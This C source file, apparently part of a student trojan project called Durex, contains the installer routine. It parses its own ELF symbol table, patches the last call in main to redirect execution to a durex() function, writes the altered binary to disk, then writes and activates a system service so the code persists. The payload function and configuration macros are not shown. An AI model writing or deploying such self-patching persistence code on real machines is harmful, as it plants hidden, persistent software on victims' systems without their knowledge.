/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   install.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
/*   Updated: 2019/08/06 00:51:45 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* system */
#include <stdlib.h>
/* mmap */
#include <sys/mman.h>
/* remove */
#include <stdio.h>
/* Elf64 structures*/
#include <elf.h>

#include "main.h"

static int		install_error()
{
	remove(DUREX_BINARY_FILE);
	remove(DUREX_SERVICE_FILE);
	return 1;
}

static int		modify_binary(void *data)
{
	Elf64_Ehdr	*hdr = (Elf64_Ehdr *)data;
	Elf64_Shdr	*shd = (Elf64_Shdr *)(data + hdr->e_shoff);
	Elf64_Off	mainoff = 0;
	Elf64_Off	durexoff = 0;

	// Here we retreive the offset of the main and durex functions in the binary.
	for (size_t i = 0; i < hdr->e_shnum; i++) {
		if (shd[i].sh_type == SHT_SYMTAB || shd[i].sh_type == SHT_DYNSYM) {
			Elf64_Shdr	*symbol_assoc = shd + shd[i].sh_link;
			char		*symbol_table = (char *)data + symbol_assoc->sh_offset;
			size_t		symbol_addr = (size_t)data + shd[i].sh_offset;
			Elf64_Sym	*symbol = (Elf64_Sym *)symbol_addr;

			for (size_t j = 0; j < shd[i].sh_size / shd[i].sh_entsize; j++) {
				char	*sname = symbol_table + symbol->st_name;

				if (!mystrcmp(sname, "main"))
					mainoff = symbol->st_value;
				else if (!mystrcmp(sname, "durex"))
					durexoff = symbol->st_value;
				symbol_addr += shd[i].sh_entsize;
				symbol = (Elf64_Sym *)symbol_addr;
			}
		}
	}
	if (!mainoff || !durexoff)
		return 1;
	// Now we search for a 'call ...' opcode in the main to replace with another function
	unsigned char		*ptr = (unsigned char *)(data + mainoff); // Begining of "main"
	int			off = 6;				// opcode length of "callq [offset]" is "e8 00 00 00 00" = 5
	// Compute offset from main to the last call found
	while (*ptr++ != 0xc3)				// ret opcode (go to the end of main)
		off++;
	while (*ptr-- != 0xe8)				// call opcode (get the last call before ret)
		off--;
	off = durexoff - ( mainoff + off); // Offset from main() + offset to durex()
	memcpy(ptr + 2, &off, 4);				// Change the call of the first function in the main with durex().
	return 0;
}

int			install_binary()
{
	int		durex;
	int		len;
	void	*data;
	int		size;

	if ((durex = open(e.prog, O_RDONLY)) == -1)
		return install_error();
	size = lseek(durex, 1, SEEK_END);
	data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, durex, 0);
	close(durex);
	if (size == -1 || data == MAP_FAILED)
		return install_error();
	if (modify_binary(data)) {
		munmap(data, size);
		return install_error();
	}
	durex = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755);
	if (durex < 0)
		return install_error();
	len = write(durex, data, size);
	close(durex);
	munmap(data, size);
	return (len != size) ? install_error() : 0;
}

int			install_service()
{
	int		fd;
	size_t	ret;
	
	fd = open(DUREX_SERVICE_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
	if (fd < 0)
		return install_error();
	ret = write(fd, DUREX_SERVICE_SCRIPT, sizeof(DUREX_SERVICE_SCRIPT));
	close(fd);
	if (ret != sizeof(DUREX_SERVICE_SCRIPT))
		return install_error();
	if (system(DUREX_SERVICE_ACTIVATE))
		return install_error();
	return 0;
}
